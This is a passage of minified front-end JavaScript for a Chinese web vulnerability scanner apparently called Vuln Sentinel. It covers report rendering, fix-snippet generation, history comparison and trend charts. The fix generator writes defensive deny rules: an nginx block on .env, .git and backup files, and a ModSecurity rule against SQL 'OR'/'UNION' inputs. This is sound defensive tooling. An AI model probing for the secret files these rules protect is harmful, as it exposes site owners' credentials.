style="margin-top:8px;font-weight:600">免责声明</div>',n+="<div>本报告由 Vuln Sentinel 自动生成，仅反映扫描时刻的目标配置状况，可用于客户交付、内测和修复跟踪，不构成完整安全审计结论。</div>",n+="</div>";let H=document.getElementById("result-content");if(!H){setTimeout(function(){bt(e)},0);return}H.innerHTML=n,sn(e),on(e.score)}catch(i){console.error("renderResult error:",i);let t=document.getElementById("result-content");t&&(t.innerHTML='<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">!</div><h3 style="color:var(--danger);margin-bottom:8px">报告渲染出错</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在渲染扫描报告时遇到问题，但扫描数据本身是完整的。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：'+E(i.message||String(i))+'</p><button class="btn btn-primary" onclick="location.reload()"> 刷新页面重试</button></div>')}}function zs(){if(!de||!de.redirect_reason){M("无法识别跳转目标地址");return}let i=de.redirect_reason.match(/https?:\/\/[^\s\)]+/);if(i&&i[0]){let t=i[0],s=document.getElementById("scan-url");s&&(s.value=t),yi()}else M("无法识别跳转目标地址")}function Is(){if(!de||!de.scan_id){M("当前结果暂不支持分享");return}ue("/api/history?limit=1").then(function(e){return e.json()}).then(function(e){let i=(e.history||[])[0];if(!i||!i.share_id){M("分享链接生成失败");return}let t=window.location.origin+"/api/share/"+i.share_id;navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(t).then(function(){M("分享链接已复制到剪贴板")}):prompt("复制以下分享链接：",t)})}function Cs(){let e='<div class="card fade-in-up" style="background:#3c3f41,rgba(168,85,247,0.04));border:1px solid rgba(75,110,175,0.2);text-align:center">';e+='<div style="font-size:18px;margin-bottom:8px"></div>',e+='<div style="font-size:15px;font-weight:700;margin-bottom:6px">客户交付报告已生成</div>',e+='<div style="font-size:12px;color:var(--text-secondary);line-height:1.7;margin-bottom:12px">',e+="报告包含以下内容：<br>",e+=" 风险摘要（已确认、可疑、待复核）<br>",e+=" 证据详情（响应头值、敏感路径片段、置信度、WAF 检测依据）<br>",e+=" 建议（按业务优先级分类，含修复顺序）<br>",e+=" 复测结果（上次与本次分数对比、新增与已修复问题）<br>",e+=" 评分变化趋势（如有历史记录）",e+="</div>",e+=`<button class="btn btn-primary" onclick="downloadReport('pdf')"> 立即下载 PDF</button>`,e+="</div>";let i=document.getElementById("result-content");i&&i.insertAdjacentHTML("afterbegin",e)}function Ts(e){bn(e)}function bn(e){document.querySelectorAll(".result-list-item").forEach(function(s){s.classList.remove("active")});let i=document.getElementById("finding-list-"+e);i&&i.classList.add("active"),document.querySelectorAll(".finding-detail").forEach(function(s){s.classList.remove("active")});let t=document.getElementById("finding-detail-"+e);t&&t.classList.add("active")}function As(){pe("gen-fix-btn",!0);try{if(!de){pe("gen-fix-btn",!1);return}let e=document.getElementById("gen-fix-input"),i=document.getElementById("gen-fix-output");if(!e||!i){pe("gen-fix-btn",!1);return}let t=e.value.trim();if(!t){i.innerHTML='<div style="color:var(--warning);font-size:13px;margin-top:8px">请输入服务器配置内容</div>',pe("gen-fix-btn",!1);return}let s=Bs(de.findings,t);i.innerHTML='<div style="margin-top:14px"><div class="finding-section"><h4>复测后配置</h4><div class="code-block">'+E(s.fixed)+`</div></div><div class="fixer-btns" style="margin-top:10px"><button class="fixer-btn success" onclick="copyText(this, '`+btoa(encodeURIComponent(s.fixed))+`')"> 复制配置</button></div></div>`}catch(e){console.error("generateFixFromResult error:",e);let i=document.getElementById("gen-fix-output");i&&(i.innerHTML='<div style="color:var(--danger);font-size:13px;margin-top:8px">错误： 生成失败：'+E(e.message||String(e))+"</div>")}finally{pe("gen-fix-btn",!1)}}function Bs(e,i){try{Array.isArray(e)||(e=[]),typeof i!="string"&&(i="");let t=i,s=/server\s*\{/.test(t);s||(t=`server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.html;

`);let r=[],o=[];if(e.forEach(function(a){let n=a.name||"",c=a.type||"config",p=String(c||"").toLowerCase(),v=a.fix||"";n.indexOf("缺少 ")===0&&(n.indexOf("HSTS")>=0||n.indexOf("CSP")>=0||n.indexOf("X-Frame")>=0||n.indexOf("X-Content")>=0||n.indexOf("Referrer")>=0||n.indexOf("Permissions")>=0)?v&&r.push(v):n.indexOf("敏感路径")>=0||n.indexOf("敏感文件")>=0?o.push(`location ~ /(.env|.git|.*.sql|.*.zip|.*.bak) {
    deny all;
    return 403;
}`):n.indexOf("信息泄露")>=0||n.indexOf("Server")>=0?r.push("server_tokens off;"):n.indexOf("Cookie")>=0?r.push("proxy_cookie_path / /; HttpOnly; Secure; SameSite=Strict;"):n.indexOf("CORS")>=0?r.push("add_header Access-Control-Allow-Origin 'https://your-domain.com' always;"):(p==="xss"||n.toLowerCase().indexOf("xss")>=0)&&v?r.push(`add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;`):(p==="csrf"||n.toLowerCase().indexOf("csrf")>=0||n.toLowerCase().indexOf("xsrf")>=0)&&v?o.push("# CSRF: enforce token validation, SameSite cookies, and Origin/Referer checks."):(p==="traversal"||n.toLowerCase().indexOf("path traversal")>=0||n.indexOf("目录穿越")>=0)&&v?o.push("# Traversal: normalize paths and restrict access to an allowed base directory."):(p==="ssrf"||n.toLowerCase().indexOf("ssrf")>=0)&&v?o.push("# SSRF: validate targets, block private IP ranges, and resolve DNS before fetching."):(p==="auth_weakness"||n.indexOf("认证")>=0||n.indexOf("登录")>=0)&&v?o.push("# Authentication: add CSRF tokens, secure cookies, X-Frame-Options, and centralized auth middleware."):(p==="bruteforce_protection"||n.indexOf("防爆破")>=0||n.indexOf("限流")>=0)&&v?o.push("# Brute force protection: add login throttling, account lockout, CAPTCHA/2FA, and audit logging."):(p==="unauthorized_access"||n.indexOf("未授权")>=0||n.indexOf("越权")>=0)&&v?o.push("# Unauthorized access: protect sensitive routes with authentication and object-level authorization."):(p==="api_auth_missing"||n.indexOf("API 鉴权")>=0)&&v?o.push("# API authorization: require authentication and object-level authorization for every sensitive endpoint."):(p==="sensitive_config_exposure"||n.indexOf("敏感配置")>=0)&&v?o.push("# Sensitive config: deny access to .env/.git/backups and remove secrets from public artifacts."):(p==="cmdi"||n.toLowerCase().indexOf("command injection")>=0||n.indexOf("命令注入")>=0)&&v?o.push("# Command injection: avoid shell=True, use argument arrays, and whitelist every executable argument."):(p==="xxe"||n.toLowerCase().indexOf("xxe")>=0||n.indexOf("xml external entity")>=0)&&v?o.push("# XXE: disable DTD and external entities, and use safe XML parser settings."):(p==="idor"||n.toLowerCase().indexOf("idor")>=0||n.indexOf("对象级")>=0)&&v?o.push("# IDOR: enforce object-level authorization on every record lookup."):(p==="deserialization"||n.toLowerCase().indexOf("deserialization")>=0||n.indexOf("反序列化")>=0)&&v?o.push("# Deserialization: forbid untrusted object graphs, add allowlists, and sign payloads before loading."):(p==="ssti"||n.indexOf("模板注入")>=0)&&v?o.push("# Template engine: enable auto-escaping and never concatenate user input into expressions."):(p==="open_redirect"||n.indexOf("开放重定向")>=0)&&v?o.push("# Redirects: validate targets against a whitelist and allow only trusted relative paths."):p==="sqli"&&v&&o.push('# ModSecurity: SecRule ARGS "(OR|UNION)" "deny,status:403"')}),r.length>0||o.length>0)if(s){let a=t.lastIndexOf("}"),n=t.substring(0,a),c=t.substring(a);r.length>0&&(n+=`
    # === 安全响应头（由漏洞哨兵生成） ===
`,r.forEach(function(p){p.split(`
`).forEach(function(d){d.trim()&&(n+="    "+d.trim()+`
`)})})),o.length>0&&(n+=`
    # === 拦截规则（由漏洞哨兵生成） ===
`,o.forEach(function(p){n+="    "+p+`
`})),t=n+c}else r.forEach(function(a){t+=a+`
`}),o.forEach(function(a){t+=a+`
`}),t+=`}
`;return{fixed:t}}catch(t){return console.error("generateFixFromFindings error:",t),{fixed:i||"",error:t.message||String(t)}}}function Ls(){if(!de){M("请先完成扫描");return}pe("goto-fixer-btn",!0),Se("fixer"),M("正在生成修复方案...");let e=de.url;ue("/api/fix",{method:"POST",body:JSON.stringify({url:e})}).then(function(i){return i.json()}).then(function(i){if(pe("goto-fixer-btn",!1),i.success)Ue=i.fixes,li(i.fixes,i.score);else{let t=document.getElementById("fixer-result");t&&(t.innerHTML='<div class="card"><p style="color:var(--danger)">生成失败: '+E(De(i))+"</p></div>")}}).catch(function(i){pe("goto-fixer-btn",!1);let t=xn(de.findings);Ue=t,li(t,de.score)})}function xn(e){try{Array.isArray(e)||(e=[]);let i={nginx:[],apache:[],express:[],flask:[],spring_boot:[],cloudflare:[],python:[],nodejs:[]};return e.forEach(function(t){let s=t.fix||"";s&&(i.nginx.push(s),i.apache.push(s.replace("add_header","Header set").replace("always;","")),i.express.push("// "+t.name+": "+s.substring(0,60)),i.flask.push("# "+t.name+": "+s.substring(0,60)),i.spring_boot.push("// "+t.name+": "+s.substring(0,60)),i.cloudflare.push("# "+t.name+": "+s.substring(0,60)),i.python.push("# "+t.name+": "+s.substring(0,60)),i.nodejs.push("// "+t.name+": "+s.substring(0,60)))}),i}catch(i){return console.error("generateLocalFixes error:",i),{nginx:[],apache:[],express:[],flask:[],spring_boot:[],cloudflare:[],python:[],nodejs:[]}}}function li(e,i){try{(!e||typeof e!="object")&&(e={nginx:[],python:[],nodejs:[],apache:[]});let t=document.getElementById("fixer-scan-prompt"),s=document.getElementById("fixer-lang-tabs"),r=document.getElementById("fixer-result");if(t&&(t.style.display="none"),s&&(s.style.display="block"),!r)return;let o="",a={nginx:"Nginx",python:"Python (Flask)",nodejs:"Node.js (Express)",apache:"Apache"},n={nginx:"",python:"",nodejs:"",apache:""},c=rn,p=e[c]||[];if(o+='<div class="card fade-in-up">',o+='<div class="card-title">'+n[c]+" "+a[c]+" 修复代码</div>",o+='<div style="font-size:12px;color:var(--text-lighter);margin-bottom:10px">共 '+p.length+" 条建议，评分: "+(typeof i=="number"&&!isNaN(i)?i:0)+"</div>",p.length===0)o+='<p style="color:var(--success);font-size:13px"> 未检测到需要修复的配置问题</p>';else{let v=p.map(function(d){return typeof d=="string"?d:d&&typeof d=="object"?d.code||"":String(d)}).join(`

`);o+='<div class="code-block" style="max-height:400px;overflow-y:auto">'+E(v)+"</div>",o+='<div class="fixer-btns" style="margin-top:12px">',o+=`<button class="fixer-btn success" onclick="copyFixCodeByLang('`+c+`')"> 复制代码</button>`,o+=`<button class="fixer-btn primary" onclick="downloadFixCode('`+c+`')"> 下载文件</button>`,o+="</div>"}o+='<div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border-light)">',o+='<div style="font-size:12px;color:var(--text-lighter);margin-bottom:8px">其他语言修复方案：</div>',["nginx","python","nodejs","apache"].forEach(function(v){if(v===c)return;let d=(e[v]||[]).length;o+='<div style="display:flex;justify-content:space-between;padding:4px 0;font-size:13px">',o+="<span>"+n[v]+" "+a[v]+"</span>",o+='<span style="color:var(--text-lighter)">'+d+" 条修复</span>",o+="</div>"}),o+="</div>",o+="</div>",r.innerHTML=o}catch(t){console.error("renderFixResult error:",t);let s=document.getElementById("fixer-result");s&&(s.innerHTML='<div class="card"><p style="color:var(--danger)">渲染修复结果失败: '+E(t.message||String(t))+"</p></div>")}}function Os(e){rn=e,document.querySelectorAll(".lang-tab").forEach(function(i){i.dataset.lang===e?i.className="fixer-btn primary lang-tab active":i.className="fixer-btn secondary lang-tab"}),Ue&&li(Ue,de?de.score:0)}function Ms(e,i){i=i||"fix-",["nginx","apache","express","flask","spring_boot","cloudflare"].forEach(function(s){let r=document.getElementById(i+"tab-"+s),o=document.getElementById(i+"content-"+s);r&&o&&(s===e?(r.style.background="var(--primary)",r.style.color="#fff",r.style.borderColor="var(--primary)",o.style.display="block"):(r.style.background="transparent",r.style.color="var(--text-secondary)",r.style.borderColor="var(--border)",o.style.display="none"))})}function xi(e){return Array.isArray(e)?e.map(function(i){return typeof i=="string"?i:i&&typeof i=="object"?i.code||"":String(i)}).join(`

`):""}function Ps(e){if(!Ue)return;let i=xi(Ue[e]||[]);yt(i),M("已复制 "+e+" 修复代码")}function Rs(e){if(!Ue)return;let i=xi(Ue[e]||[]),s="security-fix."+({nginx:"conf",python:"py",nodejs:"js",apache:"conf"}[e]||"txt"),r=new Blob([i],{type:"text/plain"}),o=URL.createObjectURL(r),a=document.createElement("a");a.href=o,a.download=s,document.body.appendChild(a),a.click(),document.body.removeChild(a),URL.revokeObjectURL(o),M("已下载 "+s)}async function Fs(){if(!de){M("请先完成扫描");return}let e=Ue||xn(de.findings),i=["nginx","apache","express","flask","spring_boot","cloudflare","python","nodejs"],t=new Or,s={product:"Vuln Sentinel",package_type:"repair_configuration_package",target:de.url||"",generated_at:new Date().toISOString(),generated_at_local:new Date().toLocaleString("zh-CN"),scan_id:de.scan_id||null,score:typeof de.score=="number"?de.score:null,findings:Array.isArray(de.findings)?de.findings.length:0,version:"Vuln Sentinel"};t.file("manifest.json",JSON.stringify(s,null,2)),t.file("README.txt",["Vuln Sentinel 修复配置包","目标: "+(de.url||""),"生成时间: "+new Date().toLocaleString("zh-CN"),"","内容结构:","- manifest.json: 包信息与扫描摘要","- README.txt: 使用说明","- 各平台 .txt: 对应平台的修复片段","","说明:","- 如果某个平台文件为空，表示当前扫描结果暂未生成对应配置","- 请优先查看报告中的漏洞证据和修复说明"].join(`
`));let r=!1;i.forEach(function(c){let p=e&&e[c]?e[c]:[],v=p.length===0?`暂无适用配置片段
`:xi(p)+`
`;p.length>0&&(r=!0),t.file(c+".txt",v)}),r||t.file("USAGE.txt",`当前扫描结果没有直接生成平台配置片段。请先查看报告中的漏洞证据与建议，再重新生成修复包。
`);let o=await t.generateAsync({type:"blob"}),a=URL.createObjectURL(o),n=document.createElement("a");n.href=a,n.download="vuln-sentinel-fixes-"+et(de.url)+".zip",document.body.appendChild(n),n.click(),document.body.removeChild(n),URL.revokeObjectURL(a),M("修复配置包已下载")}function js(){if(!de){M("请先完成扫描");return}let e=de.url;if(!e){M("无法获取扫描 URL");return}let i=document.getElementById("verify-fix-btn");i&&(i.disabled=!0,i.textContent="验证中..."),M("正在重新扫描验证修复效果..."),ue("/api/verify-fix",{method:"POST",body:JSON.stringify({url:e})}).then(function(t){if(t.status===402)return t.json().then(function(s){return s._status=402,s});if(!t.ok)throw new Error("接口返回 "+t.status);return t.json()}).then(function(t){if(i&&(i.disabled=!1,i.textContent="验证修复效果"),Zt(t)){M(Ht(t),"error"),Re();return}if(t.success){let s=de.score,r=t.new_score,o="重新扫描完成！评分: "+s+" → "+r;r>s?o+=" (提升 "+(r-s)+" 分)":r<s?o+=" (下降 "+(s-r)+" 分)":o+=" (无变化)",M(o);let a=(de.findings||[]).map(function(v){return v.name}),n=(t.new_findings||[]).map(function(v){return v.name}),c=a.filter(function(v){return n.indexOf(v)===-1}).length;c>0&&M("已修复 "+c+" 个安全问题");let p=Object.assign({},de,{score:t.new_score,risk_level:t.new_risk_level,findings:t.new_findings});de=p,bt(p),Se("result"),Re()}else M("验证失败: "+De(t),"error")}).catch(function(t){i&&(i.disabled=!1,i.textContent="验证修复效果"),M("验证扫描出错: "+t.message,"error")})}function wn(e){wi()}function Hs(){confirm("确定要清空所有扫描历史吗？此操作不可恢复。")&&ue("/api/history",{method:"DELETE"}).then(function(e){return e.json()}).then(function(e){M("已清空 "+(e.deleted||0)+" 条扫描历史"),wi(),xt()}).catch(function(){M("清空失败，请检查网络","error")})}function Ns(){at=!at,Be=[];let e=document.getElementById("history-compare-bar");e&&(e.style.display=at?"flex":"none"),kn(),xt(Xt)}function Ds(){at=!1,Be=[];let e=document.getElementById("history-compare-bar");e&&(e.style.display="none"),xt(Xt)}function Us(e){let i=Be.indexOf(e);if(i>=0)Be.splice(i,1);else{if(Be.length>=2){M("最多选择 2 条记录进行对比");return}Be.push(e)}kn(),xt(Xt)}function kn(){let e=document.getElementById("history-compare-count"),i=document.getElementById("history-compare-btn");e&&(e.textContent=String(Be.length)),i&&(i.disabled=Be.length!==2)}function qs(){if(Be.length!==2){M("请选择 2 条记录");return}ue("/api/history?limit=50").then(function(e){return e.json()}).then(function(e){let i=e.history||[],t=i[Be[0]],s=i[Be[1]];if(!t||!s){M("记录不存在");return}let r=$s(t,s),o='<div class="card" style="margin-bottom:16px">';o+='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">',o+='<div class="card-title"> 历史对比</div>',o+='<button class="fixer-btn secondary" style="height:32px;padding:0 12px;font-size:12px" onclick="cancelHistoryCompare()">关闭</button>',o+="</div>",o+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px">',o+='<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">',o+='<div style="font-size:12px;color:var(--text-secondary)">'+E(t.created_at||t.time||"")+"</div>",o+='<div style="font-size:24px;font-weight:800;color:'+jt(t.score)+'">'+(t.score||0)+"</div>",o+="</div>",o+='<div style="background:var(--bg);border-radius:2px;padding:10px;text-align:center">',o+='<div style="font-size:12px;color:var(--text-secondary)">'+E(s.created_at||s.time||"")+"</div>",o+='<div style="font-size:24px;font-weight:800;color:'+jt(s.score)+'">'+(s.score||0)+"</div>",o+="</div>",o+="</div>",o+='<div style="font-size:13px;margin-bottom:8px">分数变化：'+(r.scoreDelta>0?"+":"")+r.scoreDelta+" "+(r.scoreDelta>0||r.scoreDelta<0?"":"->")+"</div>",r.newIssues.length&&(o+='<div style="font-size:12px;color:var(--danger);margin-bottom:6px">新增问题（'+r.newIssues.length+"）</div>",r.newIssues.forEach(function(n){o+='<div style="font-size:12px;padding:4px 8px;background:rgba(199,84,80,0.08);border-radius:2px;margin-bottom:4px">'+E(n.name||n)+"</div>"})),r.fixedIssues.length&&(o+='<div style="font-size:12px;color:var(--success);margin-bottom:6px;margin-top:8px"> 已修复问题（'+r.fixedIssues.length+"）</div>",r.fixedIssues.forEach(function(n){o+='<div style="font-size:12px;padding:4px 8px;background:rgba(115,201,144,0.08);border-radius:2px;margin-bottom:4px">'+E(n.name||n)+"</div>"})),!r.newIssues.length&&!r.fixedIssues.length&&(o+='<div style="font-size:12px;color:var(--text-secondary);text-align:center">两次扫描结果一致，无变化</div>'),o+="</div>";let a=Qe("scan-history-list");a&&(a.innerHTML=o),Ne("history-pagination","none")}).catch(function(){M("加载失败")})}function $s(e,i){let t=(e.findings||[]).map(function(a){return a.name||a}),s=(i.findings||[]).map(function(a){return a.name||a}),r=[],o=[];return s.forEach(function(a){t.indexOf(a)===-1&&r.push({name:a})}),t.forEach(function(a){s.indexOf(a)===-1&&o.push({name:a})}),{scoreDelta:(i.score||0)-(e.score||0),newIssues:r,fixedIssues:o}}function _n(e){let i=document.getElementById("history-trend-wrap"),t=document.getElementById("history-trend-chart");if(!i||!t)return;let s=e.slice(0,5).reverse();if(s.length<2){i.style.display="none";return}i.style.display="block";let r=t.clientWidth||300,o=60,a=4,n=100,c=s.map(function(d,f){let h=a+f/(s.length-1)*(r-a*2),m=o-a-(d.score||0)/n*(o-a*2);return{x:Math.round(h),y:Math.round(m),score:d.score||0}}),p='<svg width="'+r+'" height="'+o+'" style="overflow:visible">';p+='<line x1="'+a+'" y1="'+o/2+'" x2="'+(r-a)+'" y2="'+o/2+'" stroke="var(--border)" stroke-width="1" stroke-dasharray="2,2"/>';let v=c.map(function(d,f){return(f===0?"M":"L")+d.x+","+d.y}).join(" ");p+='<path d="'+v+'" fill="none" stroke="var(--primary)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>',c.forEach(function(d){let f=d.score>=75?"#73c990":d.score>=50?"#f0a732":"#c75450";p+='<circle cx="'+d.x+'" cy="'+d.y+'" r="3" fill="'+f+'"/>'}),p+="</svg>",t.innerHTML=p}function xt(e){e=e||1,Xt=e;let i=Qe("scan-history-list");if(i){if(!ve()){i.innerHTML='<p style="text-align:center;color:var(--text-lighter);padding:20px 0">请先登录查看扫描历史</p>',Ne("history-pagination","none");return}i.innerHTML='<p style="text-align:center;color:var(--text-lighter);padding:20px 0">正在读取扫描历史...</p>',ue("/api/history?limit=50").then(function(t){return t.json()}).then(function(t){let s=t.history||[];if(s.length===0){i.innerHTML=`<div style="text-align:center;color:var(--text-lighter);padding:30px 0"><div style="font-size:13px">暂无扫描记录</div><div style="font-size:12px;margin-top:6px">点首页「开始体检」试试</div><div style="margin-top:12px"><button class="fixer-btn primary" onclick="navigateTo('scan')">开始体检</button></div></div>`,Ne("history-pagination","none");let c=document.getElementById("history-trend-wrap");c&&(c.style.display="none");return}_n(s);let r=Math.ceil(s.length/Qt),o=(e-1)*Qt,a=s.slice(o,o+Qt),n="";at||(n+='<div style="text-align:right;margin-bottom:8px">',n+='<button class="fixer-btn secondary" style="height:28px;padding:0 10px;font-size:12px" onclick="toggleHistoryCompareMode()"> 对比模式</button>',n+="</div>"),a.forEach(function(c,p){let v=o+p,d=c.score>=75?"var(--success)":c.score>=50?"var(--warning)":"var(--danger)",f=(s[v+1]||{}).score,h="";if(typeof f=="number"&&(h=(c.score||0)>f?' <span style="color:var(--success);font-size:12px"></span>':(c.score||0)<f?' <span style="color:var(--danger);font-size:12px"></span>':' <span style="color:var(--text-lighter);font-size:12px">-></span>'),at){let m=Be.indexOf(v)>=0?"checked":"";n+='<label class="menu-item" style="margin-bottom:6px;cursor:pointer;display:flex;align-items:center;gap:10px">',n+='<input type="checkbox" '+m+' onchange="onHistorySelect('+v+')" style="width:16px;height:16px;accent-color:var(--primary)">',n+='<div style="flex:1">',n+='<div style="font-weight:600;font-size:14px">'+E(c.url||c.host||"")+"</div>",n+='<div style="font-size:12px;color:var(--text-light)">'+E(c.created_at||c.time||"")+" &middot; 发现 "+(c.findings_count||0)+" 个问题</div>",n+="</div>",n+='<div style="font-size:20px;font-weight:800;color:'+d+'">'+(c.score||0)+h+"</div>",n+="</label>"}else n+='<div class="menu-item" style="margin-bottom:6px;cursor:pointer" onclick="restoreScanFromHistory('+v+')" role="button" tabindex="0" aria-label="恢复 '+E(c.url||c.host||"")+' 的扫描结果">',n+='<div style="flex:1">',n+='<div style="font-weight:600;font-size:14px">'+E(c.url||c.host||"")+"</div>",n+='<div style="font-size:12px;color:var(--text-light)">'+E(c.created_at||c.time||"")+" &middot; 发现 "+(c.findings_count||0)+" 个问题</div>",n+="</div>",n+='<div style="font-size:20px;font-weight:800;color:'+d+'">'+(c.score||0)+h+"</div>",n+="</div>"}),i.innerHTML=n,pi("history-pagination",e,r,"renderScanHistory")}).catch(function(){i.innerHTML='<p style="text-align:center;color:var(--danger);padding:20px 0">加载失败，请检查网络</p>'})}}function Ws(e){ue("/api/history?limit=50").then(function(i){return i.json()}).then(function(i){let t=i.history||[];if(!t[e])return;let s=t[e];Se("scan");let r=document.getElementById("scan-url");r&&(r.value=s.url||""),M('已填入历史网址，点击"下一步"重新扫描')}).catch(function(){M("加载历史记录失败")})}function wi(){if(!ve()){st("stat-scan-count","0"),st("stat-avg-score","-"),st("stat-fixed-count","0");return}ue("/api/history?limit=50").then(function(e){return e.json()}).then(function(e){let i=e.history||[],t=e.stats||{scan_count:i.length,fixed_count:0},s=document.getElementById("stat-scan-count"),r=document.getElementById("stat-avg-score"),o=document.getElementById("stat-fixed-count");if(s&&(s.textContent=t.scan_count||i.length),r)if(i.length===0)r.textContent="-";else{let a=i.reduce(function(n,c){return n+(c.score||0)},0);r.textContent=Math.round(a/i.length)}o&&(o.textContent=t.fixed_count||0)}).catch(function(){})}window.startScanDirect=yi;window.startScan=bi;window.updateScanStartState=lt;window.dismissHomeOnboarding=Jr;window.downloadAuditReport=ts;window.runAuditWorkbench=es;window.fillAuditTargetFromScan=Qr;window.goVerifyStep2=hs;window.cancelScan=ws;window.quickDemo=fs;window.showFullScanDetail=gs;window.downloadReport=Zr;window.toggleReportDropdown=Vr;window.showBatchScanModal=ds;window.closeBatchScanModal=cs;window.doBatchScan=ps;window.copyToken=bs;window.selectVerifyMethod=vs;window.confirmVerification=ys;window.skipVerification=ms;window.loadPublicDemo=is;window.goToFixerWithScanResult=Ls;window.switchFixLang=Os;window.clearScanHistory=Hs;window.cancelHistoryCompare=Ds;window.doHistoryCompare=qs;window.addMonitorTarget=$r;window.scanRedirectTarget=zs;window.copyFixCode=us;window.renderResult=bt;window.selectFinding=bn;window.toggleFinding=Ts;window.shareResult=Is;window.showPdfDownloadTip=Cs;window.restoreScanFromHistory=Ws;window.updateProfileStats=wi;window.renderScanHistory=xt;window.renderMonitorTargets=mi;window.renderHistoryTrendChart=_n;window.toggleHistoryCompareMode=Ns;window.onHistorySelect=Us;window.removeMonitorTarget=Wr;window.generateFixFromResult=As;window.verifyFix=js;window.downloadAllFixes=Fs;window.downloadFixCode=Rs;window.copyFixCodeByLang=Ps;window.switchFixPlatform=Ms;window.switchPublicFixTab=rs;window.doPublicDemoFix=ss;window.renderFixComparison=fn;window.showAutoFixDialog=os;window.closeAutoFixDialog=as;window.executeAutoFix=ls;window.retryScan=Es;window.retryScanWithUrl=_s;window.backToScanInput=Ss;window.calculateScore=xs;window.loadDashboard=Yr;window.loadTrend=pn;window.drawTrendChart=un;window.renderRadarChart=sn;window.buildRadarSvg=yn;window.animateScoreProgress=on;window.simulateCSRF=Dr;window.simulateXSS=Ur;window.simulateClickjacking=qr;window.updateStage=qt;window.animateStages=hn;window.finishStages=He;window.startProgressAnimation=vn;window.stopProgressAnimation=ai;window.setScanProgress=mn;window.updateScanCreditsHint=dn;window.loadTrendChart=function(e){e=e||30;let i=document.getElementById("trend-chart");if(!i)return;document.querySelectorAll(".trend-range").forEach(function(s){let r=parseInt(s.getAttribute("data-days"),10)===e;s.style.background=r?"#4b6eaf":"#45494a",s.style.color=r?"#fff":"#808080",s.style.borderColor=r?"#4b6eaf":"#555555"});let t=new Date;t.setDate(t.getDate()-e),t.setHours(0,0,0,0),qe("/api/trend?limit="+e).then(function(s){if(!s||!s.success){i.innerHTML="<span>暂无趋势数据</span>";return}let r=s.data&&s.data.series?s.data.series:{},o=Object.keys(r);if(o.length===0){i.innerHTML="<span>扫描几个目标后，即可查看分数变化趋势。</span>";return}let a={},n=0;if(o.forEach(function(v){(r[v]||[]).forEach(function(d){let f=d.time?d.time.replace(" ","T"):"",h=new Date(f);if(!h||isNaN(h.getTime())||h<t)return;n++;let m=f.split("T")[0];a[m]||(a[m]={sum:0,count:0}),a[m].sum+=typeof d.score=="number"?d.score:parseInt(d.score,10)||0,a[m].count++})}),n===0){i.innerHTML="<span>扫描几个目标后，即可查看分数变化趋势。</span>";return}let c=Object.keys(a).sort(),p=c.map(function(v){return Math.round(a[v].sum/a[v].count)});i.innerHTML=Zs(p,c)}).catch(function(s){i.innerHTML="<span>加载趋势失败，请稍后重试</span>"})};function Zs(e,i,t){if(!e||e.length===0)return"<span>暂无数据</span>";let s=640,r=120,o={top:10,right:10,bottom:24,left:30},a=s-o.left-o.right,n=r-o.top-o.bottom,c=Math.max(0,Math.min.apply(null,e)-5),v=Math.min(100,Math.max.apply(null,e)+5)-c||1;function d(O){return o.left+O/(e.length-1||1)*a}function f(O){return o.top+n-(O-c)/v*n}let h="M"+e.map(function(O,j){return d(j).toFixed(1)+" "+f(O).toFixed(1)}).join(" L"),m=h+" L"+d(e.length-1).toFixed(1)+" "+(r-o.bottom).toFixed(1)+" L"+d(0).toFixed(1)+" "+(r-o.bottom).toFixed(1)+" Z",g=e.map(function(O,j){return'<circle cx="'+d(j).toFixed(1)+'" cy="'+f(O).toFixed(1)+'" r="2.5" fill="#4b6eaf"/>'}).join(""),y=i[0]?i[0].slice(5):"",b=i[i.length-1]?i[i.length-1].slice(5):"",k=e[e.length-1],x=d(e.length-1),I=f(k),z='<rect x="'+(x-16)+'" y="'+(I-18)+'" width="32" height="14" rx="2" fill="#4b6eaf"/>',R='<text x="'+x+'" y="'+(I-8)+'" text-anchor="middle" font-size="9" fill="#fff">'+k+"</text>";return'<svg viewBox="0 0 '+s+" "+r+'" style="width:100%;height:100%"><defs><linearGradient id="trendGrad" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#4b6eaf" stop-opacity="0.35"/><stop offset="100%" stop-color="#4b6eaf" stop-opacity="0.05"/></linearGradient></defs><rect x="'+o.left+'" y="'+o.top+'" width="'+a+'" height="'+n+'" fill="rgba(0,0,0,0.1)" rx="2"/><path d="'+m+'" fill="url(#trendGrad)"/><path d="'+h+'" fill="none" stroke="#4b6eaf" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>'+g+z+R+'<text x="'+o.left+'" y="'+(r-6)+'" font-size="10" fill="#808080">'+E(y)+'</text><text x="'+(s-o.right)+'" y="'+(r-6)+'" text-anchor="end" font-size="10" fill="#808080">'+E(b)+"</text></svg>"}window.addEventListener("load",function(){gt();let e=document.getElementById("scan-url");e&&e.addEventListener("input",gt);let i=document.getElementById("auth-check-step1");i&&i.addEventListener("change",gt);let t=document.getElementById("auth-check");t&&t.addEventListener("change",gt)});function Xs(e){let i=Object.assign({},e);const t=new Set;return{getState(){return i},setState(s){i=Object.assign({},i,s),t.forEach(function(r){try{r(i)}catch(o){console.error("store subscriber error:",o)}})},subscribe(s){return t.add(s),function(){t.delete(s)}}}}const we=Xs({tickets:[],ticketFilter:"pending",user:null});async function Vs(){const e=await or(),i=e&&e.tickets?e.tickets:[];return we.setState({tickets:i}),e}function Gs(e){we.setState({ticketFilter:e})}function Js(){const e=we.getState();return e.tickets.filter(function(i){return i.status===e.ticketFilter})}function wt(e){return we.getState().tickets.find(function(t){return t.id===e})||null}async function Ks(e,i){const t=await ui(e,{status:i}),r=we.getState().tickets.map(function(o){return o.id===e?Object.assign({},o,{status:i}):o});return we.setState({tickets:r}),t}async function Ys(e,i){const t=await ui(e,{notes:i}),r=we.getState().tickets.map(function(o){return o.id===e?Object.assign({},o,{notes:i}):o});return we.setState({tickets:r}),t}async function Qs(e){const 